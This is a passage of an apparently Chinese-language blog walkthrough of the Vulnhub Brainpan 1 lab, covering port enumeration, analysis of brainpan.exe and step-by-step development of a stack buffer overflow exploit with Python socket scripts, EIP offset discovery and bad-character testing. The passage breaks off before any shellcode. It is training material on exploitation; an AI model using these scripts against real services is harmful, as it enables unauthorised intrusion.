_|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \n_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\n                                            _|                          \n                                            _|\n\n[________________________ WELCOME TO BRAINPAN _________________________]\n                          ENTER THE PASSWORD                              \n\n                          \u003e\u003e                           ACCESS DENIED\n�\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用nc连接尝试\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.166\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e\n_|                            _|                                        \n_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \n_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|\n_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\n                                            _|                          \n                                            _|\n\n[________________________ WELCOME TO BRAINPAN _________________________]\n                          ENTER THE PASSWORD                              \n\n                          \u003e\u003e \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n                          ACCESS DENIED\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试输入了些东西，显示\u003ccode\u003eACCESS DENIED\u003c/code\u003e ，应该是有密码之类的\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e10000端口\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e浏览器访问是个页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubBrainpan1/image48.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e很简陋，index就一张照片\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003edirsearch -u \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.166\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -x \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e\n//\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:\u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e: DeprecationWarning: pkg_resources \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e deprecated \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e pkg_resources \u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e                                                                                                  \n (_||| _) (/_(_|| (_| )                                                                                                           \n                                                                                                                                  \nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: \u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e | Wordlist size: \u003cspan class=\"hljs-number\"\u003e11460\u003c/span\u003e\n\nOutput File: /root/Desktop/test/reports/_192\u003cspan class=\"hljs-number\"\u003e.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.166_10000\u003c/span\u003e/_24-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e24_22\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e35.\u003c/span\u003etxt\n\nTarget: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.166\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e/\n\n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e35\u003c/span\u003e] Starting:                                                                                                              \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -    0B  - /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e  -\u003e  /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/                                   \n[\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e55\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  230B  - /\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/                                             \n                                                                             \nTask Completed                     \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e仅发现一个\u003ccode\u003e/bin\u003c/code\u003e文件夹\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e进去下载了一个 \u003ccode\u003ebrainpan.exe\u003c/code\u003e 文件，不急着打开，先查看文件\u003c/p\u003e\n\u003cp\u003e是一个32位的可执行程序\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003efile brainpan.exe \n//\nbrainpan.exe: PE32 executable (console) Intel \u003cspan class=\"hljs-number\"\u003e80386\u003c/span\u003e (stripped to external PDB), \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e MS Windows, \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e sections\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ebinwalk也没分离出什么东西\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebinwalk brainpan.exe\n/usr/lib/python3/dist-packages/binwalk/core/magic.py:\u003cspan class=\"hljs-number\"\u003e431\u003c/span\u003e: SyntaxWarning: invalid escape sequence \u003cspan class=\"hljs-string\"\u003e'\\.'\u003c/span\u003e\n  \u003cspan class=\"hljs-variable language_\"\u003eself\u003c/span\u003e.period = re.\u003cspan class=\"hljs-built_in\"\u003ecompile\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\.\"\u003c/span\u003e)\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e             \u003cspan class=\"hljs-number\"\u003e0x0\u003c/span\u003e             Microsoft executable, portable (PE)\n\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003ebrainpan.exe\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e放到windows下执行（虚拟机）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[+] initializing winsock...done.\n[+] server socket created.\n[+] bind done on port \u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e\n[+] waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e connections.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003esocket\u003c/code\u003e打开了\u003ccode\u003e9999\u003c/code\u003e端口，我们继续使用nc连接\u003c/p\u003e\n\u003cp\u003e和之前的结果一模一样\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e并且输入了字符会返回 几个字符被复制到缓冲区\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[get_reply] s = [asdasdasdas\n]\n[get_reply] copied \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e to buffer\n[+] check \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e -\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n[get_reply] s = [asdasdasdas\n]\n[get_reply] copied \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e to buffer\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e复制到缓冲区的过程，有没有可能存在缓冲区溢出漏洞呢\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e验证缓冲区溢出漏洞\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e尝试输入足够多的字符看看是否能够溢出\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e socket\na = \u003cspan class=\"hljs-string\"\u003e\"A\"\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e#先给他打个2k字符过去\u003c/span\u003e\ns = socket.socket()\ns.connect((\u003cspan class=\"hljs-string\"\u003e'192.168.75.161'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e))  // 我的windows虚拟机ip\nr = s.recv(\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e)\ns.send(a.encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e))\ns.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003ewindows下的程序直接崩溃了，说明存在缓冲区溢出漏洞\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e定位EIP\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003ewindows打开 \u003ccode\u003eImmunity Debugger\u003c/code\u003e 连接\u003ccode\u003ebrainpan.exe\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubBrainpan1/image49.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e主要关注右边的\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e因为我们知道超过2000个字符会崩溃，但是究竟是那个字符还不知道，使用\u003ccode\u003egdb pattern\u003c/code\u003e来生成2000个唯一字符来判断偏移量\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egdb-peda$ pattern create \u003cspan class=\"hljs-number\"\u003e2000\u003c/span\u003e\n\u003cspan class=\"hljs-string\"\u003e'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwA'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将字符替换刚刚的A\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e socket\na = \u003cspan class=\"hljs-string\"\u003e'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngAn6AnLAnhAn7AnMAniAn8AnNAnjAn9AnOAnkAnPAnlAnQAnmAnRAnoAnSAnpAnTAnqAnUAnrAnVAntAnWAnuAnXAnvAnYAnwAnZAnxAnyAnzAC%ACsACBAC$ACnACCAC-AC(ACDAC;AC)ACEACaAC0ACFACbAC1ACGACcAC2ACHACdAC3ACIACeAC4ACJACfAC5ACKACgAC6ACLAChAC7ACMACiAC8ACNACjAC9ACOACkACPAClACQACmACRACoACSACpACTACqACUACrACVACtACWACuACXACvACYACwACZACxACyACzA-%A-sA-BA-$A-nA-CA--A-(A-DA-;A-)A-EA-aA-0A-FA-bA-1A-GA-cA-2A-HA-dA-3A-IA-eA-4A-JA-fA-5A-KA-gA-6A-LA-hA-7A-MA-iA-8A-NA-jA-9A-OA-kA-PA-lA-QA-mA-RA-oA-SA-pA-TA-qA-UA-rA-VA-tA-WA-uA-XA-vA-YA-wA-ZA-xA-yA-zA(%A(sA(BA($A(nA(CA(-A((A(DA(;A()A(EA(aA(0A(FA(bA(1A(GA(cA(2A(HA(dA(3A(IA(eA(4A(JA(fA(5A(KA(gA(6A(LA(hA(7A(MA(iA(8A(NA(jA(9A(OA(kA(PA(lA(QA(mA(RA(oA(SA(pA(TA(qA(UA(rA(VA(tA(WA(uA(XA(vA(YA(wA(ZA(xA(yA(zAD%ADsADBAD$ADnADCAD-AD(ADDAD;AD)ADEADaAD0ADFADbAD1ADGADcAD2ADHADdAD3ADIADeAD4ADJADfAD5ADKADgAD6ADLADhAD7ADMADiAD8ADNADjAD9ADOADkADPADlADQADmADRADoADSADpADTADqADUADrADVADtADWADuADXADvADYADwA'\u003c/span\u003e\ns = socket.socket()\ns.connect((\u003cspan class=\"hljs-string\"\u003e'192.168.75.161'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e))\nr = s.recv(\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e)\ns.send(a.encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e))\ns.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e执行py文件，回到windows，\u003ccode\u003eImmunity Debugger\u003c/code\u003e 点击继续执行按钮\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubBrainpan1/image50.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到唯一字符串 \u003ccode\u003e73413973\u003c/code\u003e ，这是ASCII码的值\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e由于小端显示的原因（逆序），相当于\u003c/strong\u003e\u003ccode\u003es9As\u003c/code\u003e ，然后通过\u003ccode\u003epattern offset\u003c/code\u003e定位EIP\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egdb-peda$ pattern offset s9As\ns9As found at offset: \u003cspan class=\"hljs-number\"\u003e524\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到溢出溢出字符是524个，也就是只要发送524+4个字符，即可覆盖EIP寄存器，测试一下是否能覆盖EIP\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e socket\na = \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e524\u003c/span\u003e+\u003cspan class=\"hljs-string\"\u003e'B'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e\ns = socket.socket()\ns.connect((\u003cspan class=\"hljs-string\"\u003e'192.168.75.161'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e))\nr = s.recv(\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e)\ns.send(a.encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e))\ns.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubBrainpan1/image51.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e已经全被覆盖成了\u003ccode\u003e42424242\u003c/code\u003e也就是\u003ccode\u003eB\u003c/code\u003e ,确定了我们可以修改EIP\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e扩容ESP\u003c/h2\u003e\n\u003cp\u003e那么shellcode放到哪里，准备放到ESP,我们测试一下ESP能放多少个字符\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e修改py文件，向\u003ccode\u003eESP\u003c/code\u003e发送500个c字符\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e socket\na = \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e524\u003c/span\u003e+\u003cspan class=\"hljs-string\"\u003e'B'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e+\u003cspan class=\"hljs-string\"\u003e'c'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e\ns = socket.socket()\ns.connect((\u003cspan class=\"hljs-string\"\u003e'192.168.75.161'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e))\nr = s.recv(\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e)\ns.send(a.encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e))\ns.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e可以看到ESP被覆盖为了字符c\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubBrainpan1/image52.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e出现\u003ccode\u003ec\u003c/code\u003e的首地址是\u003ccode\u003e005FF910\u003c/code\u003e，最后出现的地址是\u003ccode\u003e005FFAE4\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e那么可以存储的长度应该是\u003ccode\u003e005FFAE4\u003c/code\u003e -\u003ccode\u003e005FF910\u003c/code\u003e = \u003ccode\u003e1D4\u003c/code\u003e ，也就是十进制的468个字符，shellcode通常在300-400\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e坏字节识别\u003c/h2\u003e\n\u003cp\u003e比如\u003ccode\u003e%00\u003c/code\u003e 在C语言中就是截断字符。坏字节即使在程序中导致程序无法正常执行的字符\u003c/p\u003e\n\u003cp\u003e坏字节字典↓，我们将它放到ESP区域看看是否有坏字节\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/cytopia/badchars\"\u003ehttps://github.com/cytopia/badchars\u003c/a\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e修改py文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e socket\nbadchars = (\n  \u003cspan class=\"hljs-string\"\u003e\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\"\u003c/span\u003e\n  \u003cspan class=\"hljs-string\"\u003e\"\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\"\u003c/span\u003e\n)\na = \u003cspan class=\"hljs-string\"\u003e'A'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e524\u003c/span\u003e+\u003cspan class=\"hljs-string\"\u003e'B'\u003c/span\u003e*\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e+badchars\ns = socket.socket()\ns.connect((\u003cspan class=\"hljs-string\"\u003e'192.168.75.161'\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e9999\u003c/span\u003e))\nr = s.recv(\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e)\ns.send(a.encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e))\ns.close()\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e发送后windows下选中ESP右键选择\u003ccode\u003efellow Dump\u003c/code\u003e 查看内存情况\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubBrainpan1/image53.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e内存是连续就不存在坏字符，出现坏字符应该是显示00\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e定位jmp esp\u003c/h2\u003e\n\u003cp\u003e输入shellcode可以放在ESP中，但是怎么保证能正常走到ESP，所以我们要找到\u003ccode\u003eJMP ESP\u003c/code\u003e的内存地址，将它覆盖到EIP处即可\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eJMP ESP\u003c/code\u003e的操作码是\u003ccode\u003eFFE4\u003c/code\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eImmuityDebugger\u003c/code\u003e 可以方便执行py脚本，左下角输入框输入 \u003ccode\u003e!mona 